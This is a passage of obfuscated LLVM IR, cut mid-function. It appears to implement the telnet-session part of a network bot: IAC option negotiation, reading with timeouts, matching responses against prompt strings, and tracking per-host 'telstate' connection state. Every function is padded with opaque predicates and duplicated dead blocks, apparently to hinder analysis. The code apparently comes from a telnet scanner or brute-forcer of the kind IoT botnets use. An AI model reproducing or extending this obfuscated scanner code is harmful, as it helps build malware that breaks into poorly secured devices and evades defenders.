  %_13 = shl i64 1, %116
  %_14 = sub i64 1, %116
  %gen15 = mul i64 %_14, %116
  %_16 = sub i64 1, %116
  %gen17 = mul i64 %_16, %116
  %_18 = sub i64 0, 1
  %gen19 = add i64 %_18, %116
  %117 = shl i64 1, %116
  %118 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %119 = load i32, i32* %14, align 4
  %_20 = shl i32 %119, 64
  %_21 = sub i32 %119, 64
  %gen22 = mul i32 %_21, 64
  %_23 = sub i32 0, %119
  %gen24 = add i32 %_23, 64
  %_25 = sub i32 0, %119
  %gen26 = add i32 %_25, 64
  %120 = sdiv i32 %119, 64
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds [16 x i64], [16 x i64]* %118, i64 0, i64 %121
  %123 = load i64, i64* %122, align 8
  %_27 = sub i64 0, %123
  %gen28 = add i64 %_27, %117
  %_29 = shl i64 %123, %117
  %_30 = sub i64 %123, %117
  %gen31 = mul i64 %_30, %117
  %_32 = sub i64 %123, %117
  %gen33 = mul i64 %_32, %117
  %_34 = sub i64 %123, %117
  %gen35 = mul i64 %_34, %117
  %124 = or i64 %123, %117
  store i64 %124, i64* %122, align 8
  %125 = load i32, i32* %14, align 4
  %_36 = shl i32 %125, 1
  %_37 = shl i32 %125, 1
  %_38 = shl i32 %125, 1
  %_39 = shl i32 %125, 1
  %_40 = sub i32 %125, 1
  %gen41 = mul i32 %_40, 1
  %126 = add nsw i32 %125, 1
  %127 = call i32 @select(i32 %126, %struct.fd_set* %18, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %19)
  %128 = icmp slt i32 %127, 1
  br label %originalBB1

originalBB45alteredBB:                            ; preds = %originalBB45, %83
  %129 = load i32, i32* %13, align 4
  br label %originalBB45
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %109 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %111

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %86

; <label>:23:                                     ; preds = %14
  %24 = load i32, i32* @x.13
  %25 = load i32, i32* @y.14
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %23
  %32 = load i8*, i8** %6, align 8
  %33 = getelementptr inbounds i8, i8* %32, i64 1
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 254, %35
  %37 = load i32, i32* @x.13
  %38 = load i32, i32* @y.14
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %46

; <label>:45:                                     ; preds = %originalBBpart2
  store i8 -4, i8* %8, align 1
  br label %85

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = load i8*, i8** %6, align 8
  %48 = getelementptr inbounds i8, i8* %47, i64 1
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 3, %50
  br i1 %51, label %52, label %76

; <label>:52:                                     ; preds = %46
  %53 = load i32, i32* @x.13
  %54 = load i32, i32* @y.14
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %61 = load i8*, i8** %6, align 8
  %62 = getelementptr inbounds i8, i8* %61, i64 1
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 253
  %66 = select i1 %65, i32 251, i32 253
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %8, align 1
  %68 = load i32, i32* @x.13
  %69 = load i32, i32* @y.14
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %84

; <label>:76:                                     ; preds = %46
  %77 = load i8*, i8** %6, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 1
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 253
  %82 = select i1 %81, i32 252, i32 254
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %8, align 1
  br label %84

; <label>:84:                                     ; preds = %76, %originalBBpart24
  br label %85

; <label>:85:                                     ; preds = %84, %45
  br label %86

; <label>:86:                                     ; preds = %85, %22
  %87 = load i32, i32* @x.13
  %88 = load i32, i32* @y.14
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %86
  %95 = load i32, i32* %5, align 4
  %96 = call i64 @send(i32 %95, i8* %8, i64 1, i32 16384)
  %97 = load i32, i32* %5, align 4
  %98 = load i8*, i8** %6, align 8
  %99 = getelementptr inbounds i8, i8* %98, i64 2
  %100 = call i64 @send(i32 %97, i8* %99, i64 1, i32 16384)
  %101 = load i32, i32* @x.13
  %102 = load i32, i32* @y.14
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %110

; <label>:109:                                    ; preds = %3
  br label %110

; <label>:110:                                    ; preds = %109, %originalBBpart28
  store i32 0, i32* %4, align 4
  br label %111

; <label>:111:                                    ; preds = %110, %13
  %112 = load i32, i32* @x.13
  %113 = load i32, i32* @y.14
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %111
  %120 = load i32, i32* %4, align 4
  %121 = load i32, i32* @x.13
  %122 = load i32, i32* @y.14
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret i32 %120

originalBBalteredBB:                              ; preds = %originalBB, %23
  %129 = load i8*, i8** %6, align 8
  %130 = getelementptr inbounds i8, i8* %129, i64 1
  %131 = load i8, i8* %130, align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 254, %132
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  %134 = load i8*, i8** %6, align 8
  %135 = getelementptr inbounds i8, i8* %134, i64 1
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 253
  %139 = select i1 %138, i32 251, i32 253
  %140 = trunc i32 %139 to i8
  store i8 %140, i8* %8, align 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %86
  %141 = load i32, i32* %5, align 4
  %142 = call i64 @send(i32 %141, i8* %8, i64 1, i32 16384)
  %143 = load i32, i32* %5, align 4
  %144 = load i8*, i8** %6, align 8
  %145 = getelementptr inbounds i8, i8* %144, i64 2
  %146 = call i64 @send(i32 %143, i8* %145, i64 1, i32 16384)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %111
  %147 = load i32, i32* %4, align 4
  br label %originalBB10
}

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = load i32, i32* @x.15
  %3 = load i32, i32* @y.16
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca %struct.telstate_t*, align 8
  %11 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %10, align 8
  %12 = load %struct.telstate_t*, %struct.telstate_t** %10, align 8
  %13 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %12, i32 0, i32 1
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %11, i32 0, i32 0
  store i32 %14, i32* %15, align 4
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %11, i32 0, i32 0
  %17 = load i32, i32* %16, align 4
  %18 = call i8* @inet_ntoa(i32 %17) #5
  %19 = load i32, i32* @x.15
  %20 = load i32, i32* @y.16
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8* %18

originalBBalteredBB:                              ; preds = %originalBB, %1
  %27 = alloca %struct.telstate_t*, align 8
  %28 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %27, align 8
  %29 = load %struct.telstate_t*, %struct.telstate_t** %27, align 8
  %30 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  store i32 %31, i32* %32, align 4
  %33 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  %34 = load i32, i32* %33, align 4
  %35 = call i8* @inet_ntoa(i32 %34) #5
  br label %originalBB
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

; <label>:7:                                      ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 %10)
  br label %12

; <label>:12:                                     ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %35, %1
  %11 = load i32, i32* @x.21
  %12 = load i32, i32* @y.22
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i8*, i8** %2, align 8
  %20 = load i32, i32* %4, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = sext i8 %23 to i32
  %25 = call i32 @isspace(i32 %24) #9
  %26 = icmp ne i32 %25, 0
  %27 = load i32, i32* @x.21
  %28 = load i32, i32* @y.22
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %38

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* %4, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %4, align 4
  br label %10

; <label>:38:                                     ; preds = %originalBBpart2
  br label %39

; <label>:39:                                     ; preds = %originalBBpart210, %38
  %40 = load i32, i32* %5, align 4
  %41 = load i32, i32* %4, align 4
  %42 = icmp sge i32 %40, %41
  br i1 %42, label %43, label %52

; <label>:43:                                     ; preds = %39
  %44 = load i8*, i8** %2, align 8
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = call i32 @isspace(i32 %49) #9
  %51 = icmp ne i32 %50, 0
  br label %52

; <label>:52:                                     ; preds = %43, %39
  %53 = phi i1 [ false, %39 ], [ %51, %43 ]
  %54 = load i32, i32* @x.21
  %55 = load i32, i32* @y.22
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %62 = load i32, i32* @x.21
  %63 = load i32, i32* @y.22
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %53, label %70, label %89

; <label>:70:                                     ; preds = %originalBBpart24
  %71 = load i32, i32* @x.21
  %72 = load i32, i32* @y.22
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %70
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, -1
  store i32 %80, i32* %5, align 4
  %81 = load i32, i32* @x.21
  %82 = load i32, i32* @y.22
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart210, label %originalBB6alteredBB

originalBBpart210:                                ; preds = %originalBB6
  br label %39

; <label>:89:                                     ; preds = %originalBBpart24
  %90 = load i32, i32* %4, align 4
  store i32 %90, i32* %3, align 4
  br label %91

; <label>:91:                                     ; preds = %originalBBpart229, %89
  %92 = load i32, i32* %3, align 4
  %93 = load i32, i32* %5, align 4
  %94 = icmp sle i32 %92, %93
  br i1 %94, label %95, label %126

; <label>:95:                                     ; preds = %91
  %96 = load i8*, i8** %2, align 8
  %97 = load i32, i32* %3, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8, i8* %96, i64 %98
  %100 = load i8, i8* %99, align 1
  %101 = load i8*, i8** %2, align 8
  %102 = load i32, i32* %3, align 4
  %103 = load i32, i32* %4, align 4
  %104 = sub nsw i32 %102, %103
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %101, i64 %105
  store i8 %100, i8* %106, align 1
  br label %107

; <label>:107:                                    ; preds = %95
  %108 = load i32, i32* @x.21
  %109 = load i32, i32* @y.22
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %107
  %116 = load i32, i32* %3, align 4
  %117 = add nsw i32 %116, 1
  store i32 %117, i32* %3, align 4
  %118 = load i32, i32* @x.21
  %119 = load i32, i32* @y.22
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart229, label %originalBB12alteredBB

originalBBpart229:                                ; preds = %originalBB12
  br label %91

; <label>:126:                                    ; preds = %91
  %127 = load i8*, i8** %2, align 8
  %128 = load i32, i32* %3, align 4
  %129 = load i32, i32* %4, align 4
  %130 = sub nsw i32 %128, %129
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8, i8* %127, i64 %131
  store i8 0, i8* %132, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %133 = load i8*, i8** %2, align 8
  %134 = load i32, i32* %4, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds i8, i8* %133, i64 %135
  %137 = load i8, i8* %136, align 1
  %138 = sext i8 %137 to i32
  %139 = call i32 @isspace(i32 %138) #9
  %140 = icmp ne i32 %139, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %70
  %141 = load i32, i32* %5, align 4
  %_ = shl i32 %141, -1
  %_7 = shl i32 %141, -1
  %_8 = sub i32 %141, -1
  %gen = mul i32 %_8, -1
  %142 = add nsw i32 %141, -1
  store i32 %142, i32* %5, align 4
  br label %originalBB6

originalBB12alteredBB:                            ; preds = %originalBB12, %107
  %143 = load i32, i32* %3, align 4
  %_13 = sub i32 %143, 1
  %gen14 = mul i32 %_13, 1
  %_15 = shl i32 %143, 1
  %_16 = shl i32 %143, 1
  %_17 = sub i32 %143, 1
  %gen18 = mul i32 %_17, 1
  %_19 = sub i32 %143, 1
  %gen20 = mul i32 %_19, 1
  %_21 = shl i32 %143, 1
  %_22 = shl i32 %143, 1
  %_23 = sub i32 %143, 1
  %gen24 = mul i32 %_23, 1
  %_25 = sub i32 %143, 1
  %gen26 = mul i32 %_25, 1
  %_27 = shl i32 %143, 1
  %144 = add nsw i32 %143, 1
  store i32 %144, i32* %3, align 4
  br label %originalBB12
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = load i32, i32* @x.23
  %3 = load i32, i32* @y.24
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %10, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %11, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %10, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %11, i32 0, i32 0
  %16 = call i32 @print(i8** null, i8* %14, %struct.__va_list_tag* %15)
  %17 = load i32, i32* @x.23
  %18 = load i32, i32* @y.24
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %16

originalBBalteredBB:                              ; preds = %originalBB, %1
  %25 = alloca i8*, align 8
  %26 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %25, align 8
  %27 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %26, i32 0, i32 0
  %28 = bitcast %struct.__va_list_tag* %27 to i8*
  call void @llvm.va_start(i8* %28)
  %29 = load i8*, i8** %25, align 8
  %30 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %26, i32 0, i32 0
  %31 = call i32 @print(i8** null, i8* %29, %struct.__va_list_tag* %30)
  br label %originalBB
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %507, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %510

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %466

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %46

; <label>:29:                                     ; preds = %22
  %30 = load i32, i32* @x.25
  %31 = load i32, i32* @y.26
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i32, i32* @x.25
  %39 = load i32, i32* @y.26
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %510

; <label>:46:                                     ; preds = %22
  %47 = load i8*, i8** %5, align 8
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 37
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  br label %483

; <label>:52:                                     ; preds = %46
  %53 = load i8*, i8** %5, align 8
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp eq i32 %55, 45
  br i1 %56, label %57, label %76

; <label>:57:                                     ; preds = %52
  %58 = load i32, i32* @x.25
  %59 = load i32, i32* @y.26
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %57
  %66 = load i8*, i8** %5, align 8
  %67 = getelementptr inbounds i8, i8* %66, i32 1
  store i8* %67, i8** %5, align 8
  store i32 1, i32* %8, align 4
  %68 = load i32, i32* @x.25
  %69 = load i32, i32* @y.26
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %76

; <label>:76:                                     ; preds = %originalBBpart24, %52
